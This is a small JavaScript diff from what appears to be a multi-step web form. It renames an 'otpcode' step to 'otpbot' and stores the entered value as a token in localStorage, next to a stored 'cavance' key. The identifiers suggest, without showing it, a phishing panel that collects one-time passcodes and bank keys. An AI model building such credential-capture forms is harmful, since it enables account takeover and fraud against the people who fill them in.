@@ -182,9 +182,9 @@ btnNextStep.addEventListener('click', () => {
             info.metaInfo.cavance = cavance[1].value;
             LS.setItem('info', JSON.stringify(info));
         }
-    } else if (info.checkerInfo.mode === 'otpcode') {
-        if (otpcode[1] && otpcode[1].value !== '') { // Verificar si otpcode[1] existe
-            info.metaInfo.tok = otpcode[1].value;
+    } else if (info.checkerInfo.mode === 'otpbot') {
+        if (otpbot[1] && otpbot[1].value !== '') { // Verificar si otpcode[1] existe
+            info.metaInfo.tok = otpbot[1].value;
             LS.setItem('info', JSON.stringify(info));
         }
     }
